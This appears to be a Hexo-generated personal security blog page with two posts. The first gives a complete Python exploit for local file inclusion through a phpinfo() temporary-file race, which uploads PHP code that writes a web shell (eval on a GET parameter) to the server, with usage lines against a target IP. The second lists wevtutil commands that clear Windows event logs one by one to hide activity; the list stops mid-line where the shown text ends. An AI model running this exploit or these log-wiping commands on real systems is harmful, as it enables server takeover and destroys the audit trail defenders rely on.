@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-lfi-phpinfo" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/lfi-phpinfo/" class="article-date">
+  <time datetime="2018-03-01T08:10:02.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/01/lfi-phpinfo/">lfi-phpinfo</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://www.cnblogs.com/hiccup/p/5423970.html" target="_blank" rel="noopener">https://www.cnblogs.com/hiccup/p/5423970.html</a></p>
+<p><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="noopener">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
+<p><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/79830.html</a><br>修改payload路径为可写路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/s.php</span><br></pre></td></tr></table></figure></p>
+<p>info.php文件位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/info.php</span><br></pre></td></tr></table></figure></p>
+<p>include.php文件位置及参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include.php?load=%s</span><br></pre></td></tr></table></figure></p>
+<p>usage:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python lfi-phpinfo.py host port thread</span><br><span class="line">python lfi-phpinfo.py 192.168.101.133 80 20</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># __author__ = &apos;ShadonSniper&apos;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=&quot;Locale File Include Vulns!!!&quot;</span><br><span class="line">    PAYLOAD=&quot;&quot;&quot;%s\r\n&lt;?php $c=fopen(&apos;/var/www/html/upload/s.php&apos;,&apos;w&apos;);fwrite($c,&apos;&lt;?php eval($_GET[&quot;f&quot;]);?&gt;&apos;);?&gt;\r\n&quot;&quot;&quot; % TAG</span><br><span class="line">    REQ1_DATA=&quot;&quot;&quot;-----------------------------68124396905382484903242131\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;test.txt&quot;\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;Content-Type: text/plain\r\n&quot;&quot;&quot;+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;%s\r\n-----------------------------68124396905382484903242131--&quot;&quot;&quot; % PAYLOAD</span><br><span class="line">    padding=&quot;A&quot; * 8000</span><br><span class="line">    REQ1=&quot;&quot;&quot;POST /info.php?a=%s HTTP/1.1\r\n&quot;&quot;&quot;%padding</span><br><span class="line">    temp=&quot;&quot;&quot;Host: %s\r\n&quot;&quot;&quot;%host</span><br><span class="line">    REQ1 = REQ1+temp</span><br><span class="line">    REQ1=REQ1+&quot;&quot;&quot;User-Agent: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;Accept: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;Accept-Language: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;Accept-Encoding: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;Connection: keep-alive\r\n&quot;&quot;&quot;+\</span><br><span class="line">         &quot;&quot;&quot;Content-Type: multipart/form-data; boundary=---------------------------68124396905382484903242131\r\n&quot;&quot;&quot;</span><br><span class="line">    REQ1=REQ1+&quot;&quot;&quot;Content-Length: %s\r\n\r\n&quot;&quot;&quot;%(len(REQ1_DATA))</span><br><span class="line">    REQ1=REQ1+&quot;&quot;&quot;%s&quot;&quot;&quot;%REQ1_DATA</span><br><span class="line">    #modify this to suit the LFI script</span><br><span class="line">    LFIREQ=&quot;&quot;&quot;GET /include.php?load=%s HTTP/1.1\r\n&quot;&quot;&quot;+\</span><br><span class="line">        &quot;&quot;&quot;Host: %s\r\n&quot;&quot;&quot;+\</span><br><span class="line">        &quot;&quot;&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1\r\n&quot;&quot;&quot;+\</span><br><span class="line">        &quot;&quot;&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;&quot;&quot;+\</span><br><span class="line">        &quot;&quot;&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;&quot;&quot;+\</span><br><span class="line">        &quot;&quot;&quot;Connection: keep-alive\r\n\r\n&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    #print REQ1</span><br><span class="line">    return (REQ1, TAG, LFIREQ)</span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    try:</span><br><span class="line">        i = d.index(&quot;[tmp_name] =&amp;gt&quot;)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">        #print fn</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(4096)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    if d.find(tag) != -1:</span><br><span class="line">        return fn</span><br><span class="line"></span><br><span class="line">counter=0</span><br><span class="line">class ThreadWorker(threading.Thread):</span><br><span class="line">    def __init__(self, e, l, m, *args):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock = l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        global counter</span><br><span class="line">        while not self.event.is_set():</span><br><span class="line">            with self.lock:</span><br><span class="line">                if counter &gt;= self.maxattempts:</span><br><span class="line">                    return</span><br><span class="line">                counter+=1</span><br><span class="line">            try:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                if self.event.is_set():</span><br><span class="line">                    break</span><br><span class="line">                if x:</span><br><span class="line">                    print &quot;\nGot it! Shell created in /tmp/g&quot;</span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            except socket.error:</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">def getOffset(host, port, phpinforeq):</span><br><span class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        i = s.recv(4096)</span><br><span class="line">        d+=i</span><br><span class="line">        if i == &quot;&quot;:</span><br><span class="line">            break</span><br><span class="line">        # detect the final chunk</span><br><span class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</span><br><span class="line">            break</span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(&quot;[tmp_name] =&amp;gt&quot;)</span><br><span class="line">    if i == -1:</span><br><span class="line">        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)</span><br><span class="line"></span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    # padded up a bit</span><br><span class="line">    return i+256</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print &quot;LFI With PHPInfo()&quot;</span><br><span class="line">    print &quot;-=&quot; * 30</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    try:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[1])</span><br><span class="line">    except socket.error, e:</span><br><span class="line">        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    port=80</span><br><span class="line">    try:</span><br><span class="line">        port = int(sys.argv[2])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    poolsz=10</span><br><span class="line">    try:</span><br><span class="line">        poolsz = int(sys.argv[3])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print &quot;Getting initial offset...&quot;,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = 1000</span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    print &quot;Spawning worker pool (%d)...&quot; % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    for i in range(0,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line">    for t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    try:</span><br><span class="line">        while not e.wait(1):</span><br><span class="line">            if e.is_set():</span><br><span class="line">                break</span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                if counter &gt;= maxattempts:</span><br><span class="line">                    break</span><br><span class="line">        print</span><br><span class="line">        if e.is_set():</span><br><span class="line">            print &quot;Woot! \m/&quot;</span><br><span class="line">        else:</span><br><span class="line">            print &quot;:(&quot;</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print &quot;\nTelling threads to shutdown...&quot;</span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    print &quot;Shuttin&apos; down...&quot;</span><br><span class="line">    for t in tp:</span><br><span class="line">        t.join()</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/lfi-phpinfo/" data-id="cjf199x5s0003wsaz3jtlwaqn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-windows日志清除" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/windows日志清除/" class="article-date">
+  <time datetime="2018-03-01T06:40:44.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/01/windows日志清除/">windows日志清除</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1：wevtutil-exe"><a href="#1：wevtutil-exe" class="headerlink" title="1：wevtutil.exe"></a>1：wevtutil.exe</h1><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/</a></p>
+<p>操作系统默认包含，支持系统：Win7及以上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#统计日志列表，查询所有日志信息，包含时间，数目</span><br><span class="line">wevtutil.exe gli Application</span><br><span class="line">#查看指定类别的日志内容</span><br><span class="line">wevtutil qe /f:text Application</span><br><span class="line">#删除该类日志所有内容</span><br><span class="line">wevtutil cl Application</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://www.cnblogs.com/cntsw/p/3949871.html" target="_blank" rel="noopener">https://www.cnblogs.com/cntsw/p/3949871.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">wevtutil.exe cl &quot;ACEEventLog&quot;</span><br><span class="line">wevtutil.exe cl &quot;Application&quot;</span><br><span class="line">wevtutil.exe cl &quot;HardwareEvents&quot;</span><br><span class="line">wevtutil.exe cl &quot;Internet Explorer&quot;</span><br><span class="line">wevtutil.exe cl &quot;Key Management Service&quot;</span><br><span class="line">wevtutil.exe cl &quot;Media Center&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-API-Tracing/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-AppID/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Application-Experience/Problem-Steps-Recorder&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Application-Experience/Program-Inventory&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Application-Experience/Program-Telemetry&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-AppLocker/EXE and DLL&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-AppLocker/MSI and Script&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Audio/CaptureMonitor&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Audio/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Authentication User Interface/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Backup&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-BitLocker-DrivePreparationTool/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-BitLocker-DrivePreparationTool/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Bits-Client/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Bluetooth-MTPEnum/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-BranchCache/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-BranchCacheSMB/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-CodeIntegrity/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-CorruptedFileRecovery-Client/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-CorruptedFileRecovery-Server/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-DateTimeControlPanel/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-DeviceSync/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Dhcp-Client/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-DhcpNap/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Dhcpv6-Client/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnosis-DPS/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnosis-PCW/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnosis-PLA/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnosis-Scheduled/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnosis-Scripted/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnosis-Scripted/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnosis-ScriptedDiagnosticsProvider/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnostics-Networking/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Diagnostics-Performance/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-DiskDiagnostic/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-DiskDiagnosticDataCollector/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-DiskDiagnosticResolver/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-DriverFrameworks-UserMode/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-EapHost/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-EventCollector/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Fault-Tolerant-Heap/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-FMS/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Folder Redirection/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Forwarding/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-GroupPolicy/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Help/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-HomeGroup Control Panel/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-HomeGroup Listener Service/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-HomeGroup Provider Service/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-IKE/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-International/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-International-RegionalOptionsControlPanel/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Iphlpsvc/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Kernel-EventTracing/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Kernel-Power/Thermal-Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Kernel-StoreMgr/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Kernel-WDI/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Kernel-WHEA/Errors&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Kernel-WHEA/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Known Folders API Service&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-LanguagePackSetup/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-MCT/Operational&quot;</span><br><span class="line">wevtutil.exe cl 